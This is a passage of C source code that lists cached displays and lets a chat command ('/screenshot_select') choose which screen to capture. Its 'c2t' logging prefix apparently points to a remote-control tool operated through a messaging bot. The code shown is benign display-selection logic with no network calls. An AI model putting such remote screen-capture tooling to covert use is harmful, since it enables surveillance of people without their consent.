        "• <b>[%d]</b> <code>%s</code> (%ux%u)%s\n"
        "  Status: %s\n",
        cached_displays[i].id,
        cached_displays[i].name,
        cached_displays[i].width,
        cached_displays[i].height,
        cached_displays[i].is_primary ? " 🌟 <i>Primary</i>" : "",
        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
  }

  if (offset + 128 < max_len) {
    snprintf(buffer + offset, max_len - offset,
             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
  }

  pthread_mutex_unlock(&display_lock);
  return 1;
}

int screenshot_select_display(const char *target) {
  pthread_mutex_lock(&display_lock);
  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
    selected_display_index = -1;
    snprintf(selected_display_target, sizeof(selected_display_target), "all");
  } else {
    int is_num = 1;
    for (const char *p = target; *p; ++p) {
      if (!isdigit((unsigned char)*p)) {
        is_num = 0;
        break;
      }
    }
    if (is_num) {
      selected_display_index = atoi(target);
      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
    } else {
      selected_display_index = -1;
      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
    }
  }
  pthread_mutex_unlock(&display_lock);
  c2t_log_info("screenshot", "Selected display target '%s'", selected_display_target);
  return 1;
}

void screenshot_get_selected_display(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;
  pthread_mutex_lock(&display_lock);
  snprintf(buffer, max_len, "%s", selected_display_target);
  pthread_mutex_unlock(&display_lock);
}

int screenshot_get_display_count(void) {
  pthread_mutex_lock(&display_lock);
  int c = cached_display_count > 0 ? cached_display_count : 1;
  pthread_mutex_unlock(&display_lock);
  return c;
}

#endif
